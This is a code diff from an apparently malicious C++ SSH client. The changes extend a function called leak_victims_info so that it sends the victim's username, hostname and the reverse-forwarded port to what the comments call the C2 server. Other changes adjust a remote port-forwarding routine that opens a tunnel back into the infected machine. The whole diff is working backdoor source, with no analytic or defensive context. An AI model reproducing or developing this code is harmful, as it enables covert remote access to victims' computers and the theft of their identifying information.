@@ -231,7 +231,7 @@ void SSHClient::remote_forwading_thread(ssh_session sess, ssh_channel chan, int 
 
 
 
-int leak_victims_info(ssh_session session)
+int SSHClient::leak_victims_info(ssh_session session, const int binded_port)
 {
 #if WIN32
     
@@ -265,7 +265,7 @@ int leak_victims_info(ssh_session session)
     getlogin_r(username, sizeof(username));
 #endif // WIN32
 
-    sprintf_s(info, sizeof(info) - 1, "%s$$%s", username, hostname);
+    sprintf_s(info, sizeof(info) - 1, "%s$$%s$$%d", username, hostname, binded_port);
     rc = ssh_channel_request_exec(channel, info);
     if (rc != SSH_OK)
     {
@@ -290,19 +290,19 @@ int leak_victims_info(ssh_session session)
  */
 void SSHClient::do_remote_forwarding(ssh_session sess, int lport, pthread_mutex_t* mutex, std::chrono::time_point<std::chrono::system_clock>* last_keep_alive) {
     debug("[OTCP] Opening port T:%d on server...\n", lport);
-    int bounded_port = 0;
+    int binded_port = 0;
     std::vector<std::thread*> thread_vector;
 #ifdef IS_DEBUG
 	int remote_liste_port = 1234;
 #else
 	int remote_liste_port = 0;
 #endif
-    auto rc = ssh_channel_listen_forward(sess, "127.0.0.1", remote_liste_port, &bounded_port);
+    auto rc = ssh_channel_listen_forward(sess, "127.0.0.1", remote_liste_port, &binded_port);
     if (rc != SSH_OK) {
         debug("[DEBUG] failed: %s\n", ssh_get_error(sess));
         goto clean;
     }
-    debug("Check port %d in remote server\n", bounded_port?bounded_port:remote_liste_port);
+    debug("Check port %d in remote server\n", binded_port ? binded_port :remote_liste_port);
     debug("[OTCP] Waiting for incoming connection...\n");
 
 	ssh_channel chan;
@@ -337,7 +337,7 @@ void SSHClient::do_remote_forwarding(ssh_session sess, int lport, pthread_mutex_
         debug("\n[OTCP] Connection received\n");
         
         // Send victims username and hostname to the C2
-        if (leak_victims_info(sess) != SSH_OK) {
+        if (leak_victims_info(sess, binded_port) != SSH_OK) {
             debug("Error leaking victim's info\n");
         }
 
